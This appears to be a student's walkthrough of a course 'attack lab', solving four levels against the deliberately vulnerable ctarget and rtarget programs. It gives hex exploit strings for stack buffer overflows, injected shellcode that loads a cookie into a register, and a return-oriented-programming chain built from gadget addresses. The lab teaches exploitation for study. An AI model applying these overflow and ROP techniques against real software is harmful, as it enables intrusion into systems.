## LEVEL 1

This one is pretty straightforward, if you look at the code for getbuf(), you can immediately see the size of area it opened on the stack, 
    sub    $0x38,%rsp

You can see that it opened 0x38 byes (56 bytes in decimal), if we overflow this buffer and add the address of touch1 in the overflowed buffer, we should be able to get the function to return to touch 1

so, first we need to fill the 56 bytes with whatever basically, it doesn't really matter right now

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

there we go! it's 56 bytes of nothing!, after that, we begin the buffer overflow attack, so we just need to change the return function to touch 1

so we look below to see where touch1 starts, which just happens to be 00000000004014ee

We can play around with hex2raw for a bit and find out that we are working in little-endianess, we need to put the order of the bytes in reverse, so we can do by flipping that address

00000000004014ee -> ee14400000000000

So, if we add this to our overflow function, we should be able to get the getbuf() string to call our touch1 function, and since if we look at the provided c code for touch1, we can see that we don't need to call it with anything special, so we should be able to just add that to the end of our "attack" data

so, our "attack" should look like such

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ee 14 40 00 00 00 00 00

if we run ctartget with passing the attack string, we can check to see that this works

*Run* 

cat level1.txt | ./hex2raw | ./ctarget

**We got it!**

## LEVEL 2

So, first things first we can look at the provided c code to see what's happening in touch2, and you can see that we need to inject some sort of code to make it seem like we used our cookie as an argument when we called touch2.

We can start by finding out what the address of our cookie is, and we can just look above in phase 1 to see what it is,

0x30cd1ee4

so, we need to pass this function as an argument into phase 2, and the way to do that is by somehow running a move command to move our cookie into %rdi (the first agrument register)

in assembly we would do this as such -> 

movq $0x30cd1ee4, %rdi
retq

this would move the cookie into the register then return (since we can't use jmp's)

now we can convert this to hex as shown in appendix b, by compiling with gcc then dissasembling it, which gets us ->

   0:   48 c7 c7 e4 1e cd 30    mov    $0x30cd1ee4,%rdi
   7:   c3                      retq  

        gcc -c convert-to-hex.s
        objdump -d convert-to-hex.o

Next, we need to find the stack pointer of our entered value so we can make OUR code (above) run during the return statement instead of the original return statment, so it can then move the data, and call the touch2 function.
so, we now have hex values for what we need to do, we just need to find the address of the rsp (stack) register, which we can find by running the program in gdb, we feed it some string longer than our buffer and we can then print our $rsp (the string we just entered) and find that the address is ->

0x5563e918

so, now we can piece together our cookie. 

starting with the previous cookie as a starting point (cause i'm lazy) we can 

48 c7 c7 e4 1e cd 30 c3 //our move function to move our cookie into the argument
00 00 00 00 00 00 00 00 //padding to create overflow
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
18 e9 63 55 00 00 00 00 //address of register %rsp (stack)
1c 15 40 00 00 00 00 00 //return to touch2 instead of whatever it was

*Run* 

cat level2.txt | ./hex2raw | ./ctarget

**We got it!** 

## Level 3

Ok, so phase 3 includes 2 parts, one is the touch3 function and the other is the hexmatch function,

The touch3 function takes a pointer of a string (or some other address of a string)

inside touch3 we're calling a function that will check our cookie again, but this time we need to be careful to make sure that our cookie won't get overwritten by the hexmatch function.

So, first things first, we'll need to set our attack string to return to touch3, so we can grab the address of touch3 from the dissasembled file

touch3 = 0x401633

So, since our buffer is getting overwritten, we need to store our string outside our buffer, so we can do that by storing it 0x48 bytes above the start of our buffer (it'll be after the return command)
size of buffer  base pointer   return function 
0x38           +    0x8      +       0x8       = 0x48

start of buffer.        where we need to store our cookie so it doesn't get erased
0x5563e918     + 0x48 = 0x5563e960

so that's where we'll store our cookie

same as with phase 2 we'll move the cookie into the first argument, but this time our cookie is going to be a pointer to a string rather than just an address of the cookie.

write the assembly for moving to the first argument and returning

movq $0x5563e960,%rdi
retq

compile and dissass to show what the hex we need is
    0:   48 c7 c7 60 e9 63 55    mov    $0x5563e960,%rdi
   7:   c3                      retq  

so, now we have the code that will set the first argument to the pointer of the string

now since the function takes a string instead of looking for a hex value, we can convert the location of our cookie (in hex) to ascii

cookie in hex -> cookie in ascii
0x30cd1ee4 -> 33 30 63 64 31 65 65 34


so, now we should have everything we need to create our "attack"

48 c7 c7 60 e9 63 55 c3 //our move to move the pointer to the cookie into the argument and ret
00 00 00 00 00 00 00 00 //padding to create overflow
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
18 e9 63 55 00 00 00 00 //address of register %rsp (stack)
33 16 40 00 00 00 00 00 //return to touch3 instead of whatever it was
33 30 63 64 31 65 65 34 //Cookie string

*Run* 

cat level3.txt | ./hex2raw | ./ctarget

**We got it!**

## Phase 4

This is where it gets much harder since this employs randomization and the marks the stack as nonexecutable.

So, if we go back to phase two, we move the cookie into rsp and return, so we can try to find to do the same with the cookies given.

so, we first need to find the address of touch2 (easy command + f) and cookie (cookie.txt)

touch2 000000000040151c
cookie 0x30cd1ee4

so, now we need to figure out how to move these 2 pieces of information into the correct locations.

So, we need to figure out a way to get our cookie into rdi, using only the gadgets...

The first thing we are going to do is move our cookie into %rax then we can move from %rax to %rdi then we can call touch 2

so if we reference the pdf, we can see that in order to get the cookie into rax, we need to pop %rax which in hex is 58, so we can try to find any gadget that will get a 58 next to a c3

*note* thanks to a super helpful video from computerphile, I know that hex 90 means skip this instruction and continue on, so if there happens to be a 58 90 c3 or 58 90 90 90 90 90 c3, those will work just fine :)

so, searching for 58 in the gadget farm, we can see that <addval_102> has what we need, as at the end of a line it has 58 90 90 c3. So, we take the address of that line and add an offset of 2 so that it starts right at the 58
    4016f2 + 2 = 4016f4

then we can try to figure out a way to move rax into rdi which we can see from the pdf that we need a 48 89 c7 (once again the 90 applies)

searching the gadget farm, we can see that <setval_160> has exactly what we are looking for with 48 89 c7 90 \n c3 this will move %rax into %rdi, so once again calculate the offset of the part we need and find that
    4016e4 + 2 = 4016e6

finally we just need to return into touch 2 and we should be good :)

so, create an attack that does that! (little endian :D)

00 00 00 00 00 00 00 00 //Buffer
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
f4 16 40 00 00 00 00 00 //gadget 1 (pop %rax ret)
e4 1e cd 30 00 00 00 00 //cookie 
e6 16 40 00 00 00 00 00 //gadget 2 (movq %rax, %rdi ret)
1c 15 40 00 00 00 00 00 //touch2

*Run* 

cat level4.txt | ./hex2raw | ./rtarget

**We got it!**